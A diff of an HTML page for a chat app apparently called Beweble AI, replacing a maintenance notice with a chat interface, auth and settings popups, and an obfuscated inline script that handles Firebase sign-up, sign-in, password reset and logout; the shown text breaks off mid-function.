@@ -1,123 +1,985 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Under Maintenance</title>
-<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Nunito+Sans:wght@400;600&display=swap" rel="stylesheet">
-<style>
-/* ===== RESET & BASIC ===== */
-* { margin:0; padding:0; box-sizing:border-box; font-family:'Nunito Sans', sans-serif; }
-html, body { height:100%; width:100%; overflow:hidden; background: #0f172a; }
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>beweble</title>
 
-/* ===== SMOOTH BACKGROUND GRADIENT WITH LIGHT GLOW ===== */
-body {
-    display: flex; justify-content:center; align-items:center; text-align:center;
-    background: linear-gradient(135deg, #020617, #0f172a, #1e1e1e);
-    animation: bgShift 20s ease infinite;
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Nunito+Sans:opsz,wght@6..12,400;6..12,600&display=swap" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="style.css">
+
+<style>
+    
+/* ===== SIDE MENU ===== */
+.side-menu {
+    position: fixed;       /* مثبتة على الشاشة */
+    top: 0;
+    left: -260px;          /* مخفية في البداية */
+    width: 260px;
+    height: 100%;
+    background-color: #020617;
+    padding: 20px;
+    box-shadow: 3px 0 15px rgba(0, 0, 0, 0.5); /* ظل جانبي */
+    transition: left 0.3s ease;
+    z-index: 1000;
+    display: flex;
+    flex-direction: column;
+}
+
+.side-menu.open {
+    left: 0;               /* تظهر عند إضافة الكلاس open */
+}
+
+.side-menu h2 {
+    margin-top: 0;
+    margin-bottom: 20px;
+    font-size: 24px;
+    color: #fff;
+    font-family: 'Poppins', sans-serif; /* تغيير الخط */
+}
+
+.side-menu ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+    flex-grow: 1;
+}
+
+.side-menu li {
+    margin: 15px 0;
+}
+
+.side-menu a {
+    color: #fff;
+    text-decoration: none;
+    font-size: 18px;
+    transition: color 0.2s;
+    font-family: 'Poppins', sans-serif; /* تغيير الخط */
+}
+
+.side-menu a:hover {
+    color:#8a2be2; /* تأثير عند المرور على الرابط */
+}
+
+/* زر الإغلاق */
+.close-menu {
+    background: none;
+    border: none;
+    color: #fff;
+    font-size: 24px;
+    cursor: pointer;
+    align-self: flex-end;
+    margin-bottom: 20px;
+}
+
+/* ===== MENU BUTTON ===== */
+#menu-btn {
+    font-size: 24px;
+    background: none;
+    border: none;
+    color: #fff;
+    cursor: pointer;
+
+    position: fixed;   /* مثبت في الشاشة */
+    top: 5px;         /* مسافة من أعلى الشاشة */
+    left: 20px;        /* مسافة من يسار الشاشة */
+    z-index: 1100;     /* فوق كل العناصر */
+}
+/* ===== Pop-up overlay ===== */
+/* Pop-up overlay */
+.popup {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1200;
+}
+
+.popup.hidden {
+    display: none;
+}
+
+.popup-content {
+    background: #1e1e1e;
+    padding: 25px 35px;
+    border-radius: 12px;
+    max-width: 420px;
+    width: 90%;
+    color: #fff;
     position: relative;
 }
 
-body::before {
-    content:'';
-    position:absolute; width:500px; height:500px;
-    background: #8a2be2; border-radius:50%;
-    filter: blur(160px); opacity:0.5;
-    animation: glowMove 10s infinite alternate ease-in-out;
-    z-index:0;
+.popup-content .close-popup {
+    position: absolute;
+    top: 10px;
+    right: 15px;
+    font-size: 24px;
+    background: none;
+    border: none;
+    color: #fff;
+    cursor: pointer;
 }
 
-body::after {
-    content:'';
-    position:absolute; width:400px; height:400px;
-    background: #00f5ff; border-radius:50%;
-    filter: blur(120px); opacity:0.3;
-    animation: glowMoveAlt 14s infinite alternate ease-in-out;
-    z-index:0;
+.popup-content form input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 12px;
+    border-radius: 8px;
+    border: 1px solid #555;
+    background: #2b2b2b;
+    color: #fff;
+    font-size: 16px;
+}
+/* نص الرسالة داخل البوب اب */
+
+.popup-content form button {
+    padding: 12px 25px;
+    background: #8a2be2;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
 }
 
-@keyframes bgShift {
-    0% { background-position:0% 50%; }
-    50% { background-position:100% 50%; }
-    100% { background-position:0% 50%; }
+.popup-content form button:hover {
+    background: #8a2be2;
 }
 
-@keyframes glowMove {
-    from { transform: translate(-50%, -50%) scale(1); }
-    to { transform: translate(50%, 50%) scale(1.1); }
+.form-message {
+    display: none;
+    color: #8a2be2;
+    font-weight: 600;
+    margin-top: 10px;
+    text-align: center;
 }
 
-@keyframes glowMoveAlt {
-    from { transform: translate(50%, -50%) scale(1); }
-    to { transform: translate(-50%, 50%) scale(1.05); }
+/* ===== WELCOME SCREEN ===== */
+/* ===== WELCOME SCREEN ===== */
+.welcome-screen {
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(circle at top, #0f172a, #020617);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 2000;
+    color: #fff;
+    text-align: center;
+    overflow: hidden;
+    transition: opacity 0.6s ease, transform 0.6s ease;
 }
 
-/* ===== MAINTENANCE CARD ===== */
-.maintenance-card {
-    position: relative; z-index:1;
-    max-width: 450px; padding:50px 35px;
-    background: linear-gradient(145deg, rgba(30,30,30,0.95), rgba(20,20,30,0.85));
-    border-radius:30px;
-    box-shadow: 0 10px 40px rgba(138,43,226,0.5), 0 0 20px rgba(0,245,255,0.2);
-    animation: fadeInUp 1s ease forwards;
+/* Glow animation background */
+.welcome-screen::before {
+    content: "";
+    position: absolute;
+    width: 300px;
+    height: 300px;
+    background: #8a2be2;
+    filter: blur(120px);
+    animation: moveGlow 6s infinite alternate ease-in-out;
 }
 
-/* ===== LOGO ===== */
-.maintenance-card .logo {
-    width:140px; margin-bottom:20px;
+@keyframes moveGlow {
+    from { transform: translate(-50%, -50%); }
+    to { transform: translate(50%, 50%); }
 }
 
-/* ===== TEXT ===== */
-.maintenance-card h1 {
-    font-size:2.2rem; font-weight:700;
+/* Title */
+.welcome-screen h1 {
+    font-size: 2.5rem;
     background: linear-gradient(90deg, #8a2be2, #00f5ff);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
-    margin-bottom:12px;
-    line-height:1.2;
+    animation: fadeInUp 1s ease forwards;
 }
 
-.maintenance-card p {
-    font-size:16px; color:#ccc; margin-bottom:28px; line-height:1.5;
+/* Subtitle */
+.welcome-screen p {
+    margin-top: 10px;
+    color: #ccc;
+    animation: fadeInUp 1.5s ease forwards;
 }
 
-/* ===== BUTTON ===== */
-.maintenance-card button {
-    padding:12px 40px;
+/* Button */
+.welcome-screen button {
+    margin-top: 30px;
+    padding: 14px 40px;
     background: linear-gradient(90deg, #8a2be2, #00f5ff);
-    border:none; border-radius:20px;
-    color:#fff; font-size:15px; font-weight:600;
-    cursor:pointer;
-    box-shadow: 0 0 25px rgba(138,43,226,0.5);
-    transition:0.4s ease;
+    border: none;
+    border-radius: 12px;
+    color: #fff;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+    box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
+    animation: fadeInUp 2s ease forwards;
 }
 
-.maintenance-card button:hover {
-    transform: scale(1.07);
-    box-shadow: 0 0 35px rgba(0,245,255,0.7);
+.welcome-screen button:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 30px rgba(0, 245, 255, 0.8);
 }
 
-/* ===== COPYRIGHT ===== */
-.maintenance-card .copyright {
-    margin-top:20px; font-size:12px; color:#888;
-}
-
-/* ===== ANIMATION ===== */
+/* Animations */
 @keyframes fadeInUp {
-    from { opacity:0; transform:translateY(30px); }
-    to { opacity:1; transform:translateY(0); }
+    from {
+        opacity: 0;
+        transform: translateY(40px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+/* ===== AUTH POPUP ===== */
+
+#auth .popup-content {
+    background: rgba(15, 23, 42, 0.9);
+    backdrop-filter: blur(20px);
+    border-radius: 18px;
+    text-align: center;
+    box-shadow: 0 0 40px rgba(138, 43, 226, 0.4);
+}
+
+/* INPUT */
+
+#auth input {
+    width: 100%;
+    padding: 12px;
+    margin: 6px 0;
+    border-radius: 10px;
+    border: 1px solid #333;
+    outline: none;
+    background: #111827;
+    color: white;
+}
+
+/* BUTTONS */
+
+#auth button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 8px;
+    border-radius: 10px;
+    border: none;
+    cursor: pointer;
+    font-weight: 600;
+}
+
+/* SIGN IN */
+
+#login {
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    color: white;
+}
+
+/* SIGN UP */
+
+#signup {
+    background: #1f2937;
+    border: 1px solid #444;
+    color: white;
+}
+
+/* FORGOT PASSWORD */
+
+.forgot-container {
+    width: 100%;
+    display: flex;
+    justify-content: flex-end;
+    margin-top: 5px;
+}
+
+#reset {
+    background: none;
+    border: none;
+    color: #00f5ff;
+    font-size: 13px;
+    cursor: pointer;
+    padding: 0;
+}
+
+/* MESSAGE */
+
+#auth-msg {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #8a2be2;
+}
+
+/* LOGO */
+
+.auth-logo {
+    width: 120px;
+    margin-bottom: 10px;
+}
+
+/* TITLE */
+
+.auth-title {
+    font-size: 26px;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+/* VERSION */
+
+.auth-version {
+    display: inline-block;
+    padding: 6px 14px;
+    border-radius: 20px;
+    background: rgba(138, 43, 226, 0.2);
+    margin-bottom: 20px;
+    font-size: 14px;
+}
+
+/* HIDDEN */
+
+.hidden {
+    display: none !important;
+}
+.menu-logo-box {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 20px;
+}
+
+.menu-logo-box img {
+    width: 25px;
+}
+
+.menu-logo-box span {
+    font-size: 20px;
+    font-weight: 600;
+    color: white;
+}
+.plus-icon {
+    margin-left: 6px;
+    color: #fff;
+    font-weight: bold;
+    font-size: 18px;
+}
+
+.purple-dot {
+  display: inline-block;
+  width: 10px;             /* حجم النقطة */
+  height: 10px;
+  background-color: purple; /* اللون البنفسجي */
+  border-radius: 50%;       /* لتصبح دائرة */
+  margin-right: 6px;        /* مسافة بين النقطة والكلمة */
+  vertical-align: middle;
+  animation: blink 1s infinite; /* تأثير وميض */
+}
+
+@keyframes blink {
+  0%, 50%, 100% { opacity: 1; }
+  25%, 75% { opacity: 0; }
+}
+
+/* ===== PROFILE POPUP ===== */
+#profile-popup .popup-content {
+    background: linear-gradient(145deg, #1f1f2e, #0a0a13);
+    border-radius: 18px;
+    padding: 30px 35px;
+    max-width: 450px;
+    width: 90%;
+    box-shadow: 0 10px 30px rgba(138, 43, 226, 0.4);
+    position: relative;
+    color: #fff;
+    font-family: 'Nunito Sans', sans-serif;
+}
+
+/* Close button */
+#profile-popup .close-popup {
+    position: absolute;
+    top: 12px;
+    right: 15px;
+    font-size: 24px;
+    background: none;
+    border: none;
+    color: #fff;
+    cursor: pointer;
+    transition: 0.3s;
+}
+#profile-popup .close-popup:hover {
+    color: #8a2be2;
+    transform: rotate(90deg);
+}
+
+/* Title */
+#profile-popup h3 {
+    font-size: 24px;
+    text-align: center;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 20px;
+}
+
+/* Form inputs */
+#profile-popup input {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0;
+    border-radius: 12px;
+    border: 1px solid #555;
+    background: #2b2b3c;
+    color: #fff;
+    font-size: 16px;
+    transition: 0.3s;
+}
+#profile-popup input:focus {
+    border-color: #8a2be2;
+    box-shadow: 0 0 8px rgba(138, 43, 226, 0.5);
+    outline: none;
+}
+
+/* Submit button */
+#profile-popup button[type="submit"] {
+    width: 100%;
+    padding: 14px;
+    margin-top: 12px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    color: #fff;
+    transition: 0.3s;
+    box-shadow: 0 4px 20px rgba(138, 43, 226, 0.4);
+}
+#profile-popup button[type="submit"]:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 25px rgba(0, 245, 255, 0.6);
+}
+
+/* Success message */
+/* ===== REAUTH POPUP POPUP-CONTENT ===== */
+#reauth-popup .popup-content {
+    background: linear-gradient(145deg, #1f1f2e, #0a0a13);
+    border-radius: 18px;
+    padding: 30px 35px;
+    max-width: 450px;
+    width: 90%;
+    box-shadow: 0 10px 30px rgba(138, 43, 226, 0.4);
+    position: relative;
+    color: #fff;
+    font-family: 'Nunito Sans', sans-serif;
+    text-align: center;
+}
+
+/* Close button */
+#reauth-popup .close-popup {
+    position: absolute;
+    top: 12px;
+    right: 15px;
+    font-size: 24px;
+    background: none;
+    border: none;
+    color: #fff;
+    cursor: pointer;
+    transition: 0.3s;
+}
+#reauth-popup .close-popup:hover {
+    color: #8a2be2;
+    transform: rotate(90deg);
+}
+
+/* Title */
+#reauth-popup h3 {
+    font-size: 24px;
+    margin-bottom: 15px;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+/* Inputs */
+#reauth-popup input {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0;
+    border-radius: 12px;
+    border: 1px solid #555;
+    background: #2b2b3c;
+    color: #fff;
+    font-size: 16px;
+    transition: 0.3s;
+}
+#reauth-popup input:focus {
+    border-color: #8a2be2;
+    box-shadow: 0 0 8px rgba(138, 43, 226, 0.5);
+    outline: none;
+}
+
+/* Submit button */
+#reauth-submit {
+    width: 100%;
+    padding: 14px;
+    margin-top: 12px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    color: #fff;
+    transition: 0.3s;
+    box-shadow: 0 4px 20px rgba(138, 43, 226, 0.4);
+}
+#reauth-submit:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 25px rgba(0, 245, 255, 0.6);
+}
+
+/* Error message */
+#reauth-msg {
+    display: none;
+    color: #ff4d4d;
+    font-weight: 600;
+    margin-top: 12px;
+    text-align: center;
+    animation: fadeInMsg 0.5s ease forwards;
+}
+
+/* ===== Keep "Delete My Account" Text Button EXACTLY AS BEFORE ===== */
+#delete-account-text {
+    color: #ff4d4d;
+    font-weight: 600;
+    text-align: center;
+    margin-top: 15px;
+    cursor: pointer;
+    transition: 0.3s;
+    text-decoration: underline;
+    display: block;        /* هذا يخليها تأخذ عرض كامل */
+    width: 100%;
+}
+
+#delete-account-text:hover {
+    color: #ff0000;
+    transform: scale(1.05);
+}
+/* ===== CONTACT POPUP ===== */
+#contact-popup .popup-content {
+    background: linear-gradient(145deg, #1f1f2e, #0a0a13);
+    border-radius: 18px;
+    padding: 30px 35px;
+    max-width: 450px;
+    width: 90%;
+    box-shadow: 0 10px 30px rgba(138, 43, 226, 0.4);
+    position: relative;
+    color: #fff;
+    font-family: 'Nunito Sans', sans-serif;
+}
+
+/* Close button */
+#contact-popup .close-popup {
+    position: absolute;
+    top: 12px;
+    right: 15px;
+    font-size: 24px;
+    background: none;
+    border: none;
+    color: #fff;
+    cursor: pointer;
+    transition: 0.3s;
+}
+#contact-popup .close-popup:hover {
+    color: #8a2be2;
+    transform: rotate(90deg);
+}
+
+/* Title */
+#contact-popup h3 {
+    font-size: 24px;
+    text-align: center;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 20px;
+}
+
+/* Form inputs */
+#contact-popup input,
+#contact-popup input[type="text"] {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0;
+    border-radius: 12px;
+    border: 1px solid #555;
+    background: #2b2b3c;
+    color: #fff;
+    font-size: 16px;
+    transition: 0.3s;
+}
+#contact-popup input:focus,
+#contact-popup input[type="text"]:focus {
+    border-color: #8a2be2;
+    box-shadow: 0 0 8px rgba(138, 43, 226, 0.5);
+    outline: none;
+}
+
+/* Submit button */
+#contact-popup button[type="submit"] {
+    width: 100%;
+    padding: 14px;
+    margin-top: 12px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    color: #fff;
+    transition: 0.3s;
+    box-shadow: 0 4px 20px rgba(138, 43, 226, 0.4);
+}
+#contact-popup button[type="submit"]:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 25px rgba(0, 245, 255, 0.6);
+}
+
+/* Success message */
+#form-success {
+    display: none;
+    color: #00f5ff;
+    font-weight: 600;
+    margin-top: 12px;
+    text-align: center;
+    animation: fadeInMsg 0.5s ease forwards;
+}
+
+@keyframes fadeInMsg {
+    from { opacity: 0; transform: translateY(-5px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+#reauth-popup input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 8px;
+    border: 1px solid #555;
+    background: #2b2b3c;
+    color: #fff;
+}
+
+#reauth-submit {
+    width: 100%;
+    padding: 12px;
+    margin-top: 12px;
+    border-radius: 8px;
+    border: none;
+    background: #ff4d4d;
+    color: #fff;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+#reauth-submit:hover {
+    background: #ff0000;
+}
+
+#reauth-msg {
+    display: none;
+    color: #ff4d4d;
+    text-align: center;
+    margin-top: 10px;
+}
+
+#change-email-popup .popup-content {
+    background: linear-gradient(145deg, #1f1f2e, #0a0a13);
+    border-radius: 18px;
+    padding: 30px 35px;
+    max-width: 450px;
+    width: 90%;
+    box-shadow: 0 10px 30px rgba(138, 43, 226, 0.4);
+    position: relative;
+    color: #fff;
+    font-family: 'Nunito Sans', sans-serif;
+    text-align: center;
+}
+
+#change-email-popup input {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0;
+    border-radius: 12px;
+    border: 1px solid #555;
+    background: #2b2b3c;
+    color: #fff;
+    font-size: 16px;
+    transition: 0.3s;
+}
+#change-email-popup input:focus {
+    border-color: #8a2be2;
+    box-shadow: 0 0 8px rgba(138, 43, 226, 0.5);
+    outline: none;
+}
+
+#change-email-btn {
+    width: 100%;
+    padding: 14px;
+    margin-top: 12px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    color: #fff;
+    transition: 0.3s;
+    box-shadow: 0 4px 20px rgba(138, 43, 226, 0.4);
+}
+#change-email-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 25px rgba(0, 245, 255, 0.6);
+}
+
+#change-email-msg {
+    display: none;
+    color: #8a2be2;
+    font-weight: 600;
+    margin-top: 12px;
+    text-align: center;
 }
 </style>
+
 </head>
+<div id="profile-popup" class="popup hidden">
+    <div class="popup-content">
+        <button class="close-popup">✖</button>
+        <h3>My Profile Settings</h3>
+        <form id="profile-form">
+            <input type="text" name="displayName" placeholder="Display Name" required>
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="New Password">
+            <button type="submit">Save Changes</button>
+        </form>
+        <p id="profile-msg" class="form-message">Profile updated successfully!</p>
+        
+        <!-- النص الجديد لحذف الحساب -->
+        <p id="delete-account-text">Delete My Account</p>
+    </div>
+</div>
+<!-- Change Email Popup -->
+<div id="change-email-popup" class="popup hidden">
+    <div class="popup-content">
+        <button class="close-popup">✖</button>
+        <h3>Change Email</h3>
+        <input type="email" id="new-email" placeholder="New Email" required>
+        <input type="password" id="current-password" placeholder="Current Password" required>
+        <button id="change-email-btn">Save Email</button>
+        <p id="change-email-msg" class="form-message"></p>
+    </div>
+</div>
+<div id="reauth-popup" class="popup hidden">
+    <div class="popup-content">
+        <button class="close-popup">✖</button>
+        <h3>Confirm Your Identity</h3>
+        <p>To delete your account, please sign in again:</p>
+        <input type="email" id="reauth-email" placeholder="Email" required>
+        <input type="password" id="reauth-password" placeholder="Password" required>
+        <button id="reauth-submit">Confirm & Delete</button>
+        <p id="reauth-msg" class="form-message"></p>
+    </div>
+</div>
 <body>
 
-<div class="maintenance-card">
-    <img src="https://i.top4top.io/p_37447l83x1.png" class="logo" alt="Beweble AI Logo">
-    <h1> Under Maintenance</h1>
-    <p>We're making improvements to give you a smoother, better experience.<br>Please check back shortly!</p>
-    <button onclick="window.location.reload()">Refresh</button>
-    <div class="copyright">Beweble AI © 2026 All rights reserved.</div>
+<div id="welcome" class="welcome-screen">
+    <h1>🤖 Welcome to Beweble AI</h1>
+    <p>Your intelligent assistant is ready</p>
+    <button id="start-btn">Get Started</button>
 </div>
 
+<!-- ===== Auth Popup ===== -->
+<div id="auth" class="popup hidden">
+    <div class="popup-content">
+        <img src="https://i.top4top.io/p_37447l83x1.png" class="auth-logo">
+
+<h2 class="auth-title">Beweble AI</h2>
+
+<div class="auth-version">Version 1.1.3</div>
+        
+        <input type="email" id="email" placeholder="Email">
+        <input type="password" id="password" placeholder="Password">
+        
+        <button id="signup">Sign Up</button>
+        <button id="login">Sign In</button>
+        <div class="forgot-container">
+    <button id="reset">Forgot Password?</button>
+</div>
+        <hr>
+        
+        
+        
+        <p id="auth-msg"></p>
+    </div>
+</div>
+<!-- SIDE MENU -->
+
+<!-- قائمة جانبية -->
+<div id="side-menu" class="side-menu">
+    <button class="close-menu">✖</button>
+    <img src="https://i.top4top.io/p_37447l83x1.png" class="menu-logo">
+    <ul>
+<li>
+    <a id="new-chat-btn">
+        <span class="plus-icon">+</span> New Chat
+    </a>
+</li>
+<li>
+    <a id="history-btn">
+        <span class="purple-dot"></span> History
+    </a>
+</li>
+<li>
+    <a id="profile-btn">
+        <span class="purple-dot"></span> Settings
+    </a>
+</li>
+<li>
+    <a id="contact-us-btn">
+        <span class="purple-dot"></span> Contact Us
+    </a>
+</li>
+<li>
+    <a id="privacy-policy-btn">
+      <span class="purple-dot"></span> Privacy Policy
+    </a>
+</li>
+        <li><a id="logout">
+      <span class="purple-dot"></span>
+            Logout</a></li>
+    </ul>
+</div>
+
+<div id="contact-popup" class="popup hidden">
+    <div class="popup-content">
+        <button class="close-popup">✖</button>
+        <h3>Contact Us</h3>
+        <form id="contact-form">
+            <input type="text" name="name" placeholder="Name" required>
+            <input type="email" name="_replyto" placeholder="Email" required>
+        
+            <input type="text" name="message" placeholder="Message / Issue" required></input>
+            <button type="submit">Send</button>
+        </form>
+        <p id="form-success" class="form-message">
+            Your message has been sent successfully!
+        </p>
+    </div>
+</div>
+
+<!-- Pop-up Privacy Policy -->
+<div id="privacy-popup" class="popup hidden">
+    <div class="popup-content">
+        <button class="close-popup">✖</button>
+        <h3>Privacy Policy</h3>
+        <p>
+            Your privacy is important to us. We do not share your personal information with third parties without your consent.
+        </p>
+    </div>
+</div>
+
+<div class="header">
+
+<button id="menu-btn">☰</button>
+
+
+<button id="clear-history-btn">Clear History</button>
+
+</div>
+
+<div id="chat-box"></div>
+
+<div class="input-container">
+
+<div class="file-upload-area">
+<label for="file-input" class="upload-button"> 📎 Attach File </label>
+<input type="file" id="file-input" multiple accept="*/*">
+<div id="selected-files-display" class="selected-files-display"></div>
+</div>
+
+<div class="chat-input-area">
+
+<div id="user-input" contenteditable="true" role="textbox" aria-label="Chat input"></div>
+
+<button id="mic-btn" aria-label="Record voice message">
+
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256">
+
+<path fill="currentColor" d="M128 160a32 32 0 0 0 32-32V64a32 32 0 0 0-64 0v64a32 32 0 0 0 32 32Z"/>
+
+</svg>
+
+</button>
+
+<button id="send-btn" aria-label="pSend message">
+
+<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+
+<path d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11Z"/>
+
+</svg>
+
+</button>
+
+</div>
+
+</div>
+
+<div class="footer">
+Beweble Ai © 2026 All rights reserved.
+<span class="version-info">(Version 1.1.3)</span>
+</div>
+
+<div id="history-panel" class="">
+
+<h2>Chat History</h2>
+
+<ul id="chat-list"></ul>
+
+<button id="close-history-btn">Close History</button>
+
+</div>
+<script type="module">
+    // ===== FIREBASE IMPORTS =====
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+
+const _0xfedd0b=_0x3ee3;(function(_0x2ac596,_0x238736){const _0x232645=_0x3ee3,_0x57bcaa=_0x2ac596();while(!![]){try{const _0x3cd08c=-parseInt(_0x232645(0xb3))/0x1*(parseInt(_0x232645(0xaa))/0x2)+parseInt(_0x232645(0x9b))/0x3+-parseInt(_0x232645(0xb5))/0x4*(parseInt(_0x232645(0xab))/0x5)+-parseInt(_0x232645(0x72))/0x6+-parseInt(_0x232645(0xb2))/0x7+parseInt(_0x232645(0x8b))/0x8*(parseInt(_0x232645(0x99))/0x9)+-parseInt(_0x232645(0x7c))/0xa;if(_0x3cd08c===_0x238736)break;else _0x57bcaa['push'](_0x57bcaa['shift']());}catch(_0x3b2ddc){_0x57bcaa['push'](_0x57bcaa['shift']());}}}(_0x4428,0xb5c1d));import{getAuth,createUserWithEmailAndPassword,signInWithEmailAndPassword,signOut,sendPasswordResetEmail,updateProfile,reauthenticateWithCredential,updateEmail,updatePassword,EmailAuthProvider,onAuthStateChanged}from'https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js';const firebaseConfig={'apiKey':'AIzaSyAgqj5rWFXuwldXm5-yFZj0POdS6rRYepo','authDomain':'support-c1836.firebaseapp.com','projectId':_0xfedd0b(0x6c),'storageBucket':_0xfedd0b(0x9d),'messagingSenderId':_0xfedd0b(0xb8),'appId':'1:475150183599:web:4c8a3f40f645b160b0f85a'},app=initializeApp(firebaseConfig),auth=getAuth(app),welcome=document[_0xfedd0b(0x9a)]('welcome'),authBox=document[_0xfedd0b(0x9a)]('auth'),chatBox=document[_0xfedd0b(0x9a)]('chat-box'),email=document[_0xfedd0b(0x9a)](_0xfedd0b(0x7d)),password=document['getElementById'](_0xfedd0b(0x73)),msg=document[_0xfedd0b(0x9a)](_0xfedd0b(0x80));document[_0xfedd0b(0x9a)](_0xfedd0b(0x96))['addEventListener'](_0xfedd0b(0xa4),()=>{const _0x58db36=_0xfedd0b;welcome['classList'][_0x58db36(0xb9)](_0x58db36(0x81)),authBox[_0x58db36(0x77)]['remove'](_0x58db36(0x81));}),document[_0xfedd0b(0x9a)](_0xfedd0b(0xb1))[_0xfedd0b(0xaf)]=async()=>{const _0x1dba5d=_0xfedd0b;try{const _0x90d7a1=await createUserWithEmailAndPassword(auth,email[_0x1dba5d(0xa8)],password[_0x1dba5d(0xa8)]);await setDoc(doc(db,_0x1dba5d(0x8c),_0x90d7a1['user'][_0x1dba5d(0x84)]),{'email':email[_0x1dba5d(0xa8)],'createdAt':new Date()[_0x1dba5d(0x70)]()}),msg[_0x1dba5d(0x74)]=_0x1dba5d(0xb6);}catch(_0x3f9849){msg['innerText']=_0x3f9849['message'];}},document['getElementById'](_0xfedd0b(0x9e))['onclick']=async()=>{const _0xcf1bc3=_0xfedd0b;try{await signInWithEmailAndPassword(auth,email['value'],password[_0xcf1bc3(0xa8)]),msg[_0xcf1bc3(0x74)]=_0xcf1bc3(0x83);}catch(_0x353916){msg[_0xcf1bc3(0x74)]=_0x353916['message'];}},document[_0xfedd0b(0x9a)](_0xfedd0b(0xb7))[_0xfedd0b(0xaf)]=async()=>{const _0x45ca0b=_0xfedd0b;if(!email[_0x45ca0b(0xa8)]){msg[_0x45ca0b(0x74)]='⚠️\x20Enter\x20your\x20email\x20first';return;}try{await sendPasswordResetEmail(auth,email['value']),msg[_0x45ca0b(0x74)]=_0x45ca0b(0xa2);}catch(_0x26b5b5){msg[_0x45ca0b(0x74)]=_0x26b5b5[_0x45ca0b(0x6f)];}};const logoutBtn=document[_0xfedd0b(0x9a)]('logout');logoutBtn&&(logoutBtn['onclick']=async()=>{await signOut(auth);});function _0x4428(){const _0x57a9d0=['reauth-msg','635860oYrLzv','✅\x20Account\x20created!','reset','475150183599','add','credential','support-c1836','new-email','currentUser','message','toISOString','body','944628TUTUKT','password','innerText','auth','block','classList','none','display','log','forEach','2973230iwdkPw','email','profile-popup','profile-form','auth-msg','hidden','change-email-popup','✅\x20Welcome\x20back!','uid','scale(1)','⚠️\x20Fill\x20all\x20fields','auto','reauth-email','flex','scale(1.05)','647016gglsBE','users','delete','style','addEventListener','profile-btn','transform','change-email-btn','chat-box','opacity\x200.6s\x20ease,\x20transform\x200.6s\x20ease','reauth-submit','start-btn','profile-msg','submit','135guYpjL','getElementById','4383219reXuOV','opacity','support-c1836.firebasestorage.app','login','querySelectorAll','delete-account-text','.close-popup','📩\x20Reset\x20link\x20sent\x20to\x20email','displayName','click','current-password','✅\x20Your\x20account\x20has\x20been\x20deleted.','⚠️\x20Please\x20enter\x20your\x20email\x20and\x20password','value','transition','750164TRJNRH','5qpQpJB','remove','overflow','✅\x20Email\x20changed\x20successfully!','onclick','welcome','signup','6586601pLtUow','1vZNilj'];_0x4428=function(){return _0x57a9d0;};return 